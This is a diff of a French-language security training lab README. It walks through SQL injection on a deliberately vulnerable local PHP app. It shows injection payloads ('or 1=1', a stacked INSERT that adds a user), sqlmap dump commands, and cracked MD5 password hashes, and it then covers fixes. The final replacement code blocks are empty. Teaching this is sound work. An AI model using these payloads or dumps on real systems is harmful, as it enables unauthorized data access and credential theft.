@@ -1,111 +1,151 @@
 # TP - formation sécu n°1
 
-## Installation
+## Déroulement
 
-```bash
-    docker pull astronaut1712/dvwa
-    docker pull googlesky/sqlmap
-    docker run -p 80:80 astronaut1712/dvwa
-```
+Suivre les étapes et pratiquer ou suivre la vidéo.
 
 ## Démarrage
 
-1. se connecter sur http://localhost/
-2. create/reset database
-3. s'identifier (admin / password)
-4. aller sur la page [SQL injection](http://localhost/vulnerabilities/sqli/)
-
-## Injection SQL
-
-### Le code fautif
-
-```php
-    $id = $_REQUEST['id'];
-    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
-    $result = mysql_query($query);
-```
-
-1. récupération d'un *query param* "id"
-2. construction d'une requête SQL qui demande le prénom et le nom de l'utilisateur correspondant à l'id
-3. exécution de la requête
-
-### Utilisation normale
-
-Saisir `5` dans le formulaire.
-> `id = 5`
->
->```sql
->$query  = "SELECT first_name, last_name FROM users WHERE user_id = '5';";
->```
->
-> La requête SQL envoyée à la base de donnée sera :
->> `SELECT first_name, last_name FROM users WHERE user_id = '5';`
-
-### Détection de l'existence de la faille
-
-Lorsque l'on saisit `'` dans le formulaire (juste une quote simple / une apostrophe), on obtient une erreur.
-
-> `id = '`
->
->```sql
->$query  = "SELECT first_name, last_name FROM users WHERE user_id = ''';";
->```
->
-> La requête SQL envoyée à la base de donnée sera :
->> `SELECT first_name, last_name FROM users WHERE user_id = ''';`
-
-### Exploitation manuelle de la faille
-
-> Par exemple, si `id = ' or 1=1-- -` (avec l'apostrophe et le "moins" à la fin)
->
->```sql
->$query = "SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1-- -';";
->-------------------------------------------------------------------|__________|
->```
->
-> La requête SQL envoyée à la base de donnée sera :
->> `SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1`
-
-1. la quote ferme la première chaîne de caractères
-2. `or 1=1` est une condition toujours vraie
-3. tout ce qui est après `--` est ignoré (commentaires)
-
-### Exploitation automatisée
-
-1. avec les DevTools -> storage -> cookies -> récupérer le PHPSESSID
-2. lancer sqlmap en lui donnant le votre PHPSESSID
+1. Récupérer le projet et lancer la plateforme
 
     >```bash
-    >docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap -u "http://host.docker.internal/vulnerabilities/sqli/?id=1&Submit=Submit" \
-    >   --cookie="PHPSESSID=crtiv3rujjvauflnodmeqk6uc5; security=low" --batch \
-    >   -D dvwa -T users -C user,password --dump
+    >    git pull git@github.com:frederictriquet/formation_secu_1.git
+    >    docker-compose up
     >```
 
-3. les résultats obtenus sont :
+1. Se connecter à http://localhost:8080/ avec un navigateur.
+1. Cliquer sur __reset database__
+1. Voir les mauvaises pratiques dans le code :
+    - __docker-compose.yml__ et __webapp/webroot/include/db.inc.php__
+        - l'utilisateur __root__ est utilisé pour toutes les requêtes à la base de données
+    - __webapp/webroot/reset.php__
+        - les mots de passe sont stockés __hashés en MD5__
+    - __webapp/webroot/sqli/index.php__
+        - le champ __login__ du formulaire est utilisé directement dans la requête SQL
 
-    >```code
-    >+---------+---------------------------------------------+
-    >| user    | password                                    |
-    >+---------+---------------------------------------------+
-    >| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
-    >| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
-    >| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
-    >| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
-    >| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
-    >+---------+---------------------------------------------+
+## Exploitation de l'injection SQL
+
+Le champ __password__ est volontairement visible.
+Les mots de passe se trouvent dans __webapp/webroot/reset.php__
+
+1. Cliquer sur __SQL injection__
+1. Tester le formulaire
+    - __admin__/__incorrect__ : aucun utilisateur ne correspond
+    - __admin__/__password__ : 1 utilisateur correspond
+
+1. Dans le champ __login__, tester :
+    > login = `'`
+
+    Il n'est pas utile de saisir de mot de passe.
+
+    Initialement, la requête SQL est :
+
+    >```sql
+    >$query  = "SELECT COUNT(*) FROM users WHERE login='$login' AND password='$hash';";
     >```
 
-4. essayer avec `--dump-all --all`
-5. recherchez `8d3533d75ae2c3966d7e0d4fcc69216b` ou les autres hash de mots de passe sur google
+    La requête SQL envoyée à la base de donnée sera :
 
-## Conclusions
+    >`SELECT COUNT(*) FROM users WHERE login=''' AND password='d41d8cd98f00b204e9800998ecf8427e';`
 
-1. il s'agit d'un cas simple, délibérément vulnérable, pour que l'exercice reste simple
-1. une injection SQL permet d'exécuter des requêtes SQL sur la base de données
-![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
-1. les répercussions peuvent être assez inattendues. Ici on peut récupérer :
-    * les mots de passe des utilisateurs alors que le code php n'y fait pas référence
-    * l'ensemble des bases de données du serveur
-    * les droits des utilisateurs
-1. il ne faut JAMAIS stocker des mots de passe hashés (md5 au autres)
-1. voir <https://owasp.org/www-project-top-ten/>
+    Ce qui provoque une erreur de syntaxe au niveau des 3 quotes qui se suivent.
+
+1. Première exploitation : détourner le fonctionnement du code
+
+    > login = `' or 1=1 --`
+
+    >```sql
+    >$query = "SELECT COUNT(*) FROM users WHERE login='' or 1=1 --' AND pass...";
+    >--------------------------------------------------|_________|
+    >```
+
+    - La quote ferme la première chaîne de caractères
+    - `or 1=1` est une condition toujours vraie
+    - tout ce qui est après `--` est ignoré (commentaires)
+
+    La requête SQL traitée par la base de donnée est donc :
+
+    >```sql
+    >SELECT COUNT(*) FROM users WHERE login='' or 1=1
+    >```
+
+    Cela va donc renvoyer le nombre d'utilisateurs présents dans la table __users__ au lieu de ne renvoyer que 0 ou 1 lors d'une utilisation normale.
+
+1. Deuxième exploitation : exécuter une requête arbitraire
+
+    > login = `';INSERT INTO users VALUES (12, 'fred', md5('fred')) --`
+
+    La requête devient alors :
+
+    >```sql
+    >$query = "SELECT COUNT(*) FROM users WHERE login='';INSERT INTO users VALUES (12, 'fred', md5('fred')) --' AND pass...";
+    >```
+
+    La seconde partie est une seconde requête qui ajoute un utilisateur dans la table __users__.
+
+
+1. Troisième exploitation : avec l'outil dédié __sqlmap__
+
+    > docker-compose run sqlmap -u "http://web/sqli/" --data "login=someuser&password=letMeIn" --batch --dump
+
+    Cet outil exploite les injections SQL et réussit ici à extraire le contenu et la structure des tables. Il sait déchiffrer les champs comme nos mots de passe hashés en MD5.
+
+        +----+-------+----------------------------------------------+
+        | id | login | password                                     |
+        +----+-------+----------------------------------------------+
+        | 1  | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |
+        | 2  | alice | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |
+        | 3  | bob   | e99a18c428cb38d5f260853678922e03 (abc123)    |
+        | 4  | carol | 8ae1dd156c62f4f0b0b31c29b46f8e48             |
+        | 5  | dave  | 437b930db84b8079c2dd804a71936b5f (something) |
+        | 12 | fred  | 570a90bfbf8c7eab5dc5d4e26832d5b1 (fred)      |
+        +----+-------+----------------------------------------------+
+
+    Le mot de passe un peu plus complexe de l'utilisatrice __carol__ peut être retrouvé grâce à des [rainbow tables](https://en.wikipedia.org/wiki/Rainbow_table) disponibles par exemple chez [Hash Toolkit](https://hashtoolkit.com/).
+
+
+## Corriger les vulnérabilités du code
+
+1. modifier soi-même le code ou basculer sur la branche __secure__ :
+
+    >```bash
+    >git checkout secure
+    >```
+
+1. correction du problème de stockage de mots de passe
+
+    - __webapp/webroot/reset.php__, remplacer
+
+        >```php
+        >$hash = md5($user[1]);
+        >```
+
+        par
+
+        >```php
+        >$hash = password_hash($user[1],PASSWORD_DEFAULT);
+        >```
+
+    - __webapp/webroot/reset.php__, remplacer
+
+        >```sql
+        >password CHAR(32) NOT NULL
+        >```
+
+        par
+
+        >```sql
+        >password CHAR(64) NOT NULL
+        >```
+
+    - __webapp/webroot/sqli/index.php__, remplacer
+
+        >```php
+        >
+        >```
+
+        par
+
+        >```php
+        >
+        >```
